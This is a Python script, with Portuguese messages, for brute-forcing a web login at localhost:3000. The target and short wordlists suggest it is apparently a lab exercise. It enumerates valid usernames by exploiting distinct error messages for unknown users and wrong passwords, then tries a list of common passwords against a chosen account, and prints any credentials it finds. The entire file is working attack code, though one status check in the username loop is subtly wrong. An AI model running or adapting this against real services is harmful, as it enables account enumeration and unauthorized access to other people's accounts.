import requests
import time

url = 'http://localhost:3000/login'

def brute_force_usuario_e_senha(usuario, senha):
    payload = {'username': usuario, 'password': senha}
    
    print(f"Tentando {usuario} / {senha}...")

    response = requests.post(url, data=payload)
    
    if "Erro: o usuário" in response.text:
        print(f"Erro: o usuário {usuario} não está cadastrado.")
        return "usuario_incorreto"
    elif "Erro: a senha informada" in response.text:
        print(f"Erro: a senha informada para o usuário {usuario} está incorreta.")
        return "senha_incorreta"
    elif "Login bem-sucedido!" in response.text:
        print(f"Login bem-sucedido! Usuário: {usuario}, Senha: {senha}")
        return "sucesso"
    else:
        print("Resposta inesperada.")
        return "erro_inesperado"

def brute_force_login(usuarios):
    for usuario in usuarios:
        print(f"Tentando o usuário: {usuario}...")

        resultado = brute_force_usuario_e_senha(usuario, "senha_dummy")
        
        if "Erro: o usuário" in resultado:
            print(f"Usuário {usuario} não está cadastrado.")
            continue  
        
        elif resultado == "senha_incorreta":
            print(f"Usuário {usuario} é válido, mas a senha está incorreta.")
            return usuario  

        time.sleep(0)  
    
    print("Nenhum usuário válido encontrado.")
    return None

def brute_force_senha(usuario, senhas):
    for senha in senhas:
        print(f"Tentando senha: {senha} para o usuário: {usuario}...")
        resultado = brute_force_usuario_e_senha(usuario, senha)
        
        if resultado == "sucesso":
            print(f"Senha encontrada! Usuário: {usuario}, Senha: {senha}")
            return senha

        time.sleep(0)  
    print(f"Nenhuma senha válida encontrada para o usuário {usuario}.")
    return None

def main():
    print("Escolha uma opção:")
    print("1 - Descobrir o login")
    print("2 - Descobrir a senha")
    escolha = input("Digite o número da opção: ")

    if escolha == "1":
        usuarios_tentar = ['admin', 'edu', 'dado', 'thiago', 'princesareborn', 'samurai', 'admin_actmob']
        usuario_encontrado = brute_force_login(usuarios_tentar)
        if usuario_encontrado:
            print(f"Login encontrado: {usuario_encontrado}")
        else:
            print("Nenhum login válido encontrado.")
    
    elif escolha == "2":
        usuario = input("Digite o nome de usuário para descobrir a senha: ")
        senhas_tentar = ["senha12", "password123", "admin", "123456", "senha123", "senha999"]
        senha_encontrada = brute_force_senha(usuario, senhas_tentar)
        if senha_encontrada:
            print(f"Senha encontrada para {usuario}: {senha_encontrada}")
        else:
            print(f"Nenhuma senha válida encontrada para o usuário {usuario}.")
    
    else:
        print("Opção inválida!")

main()
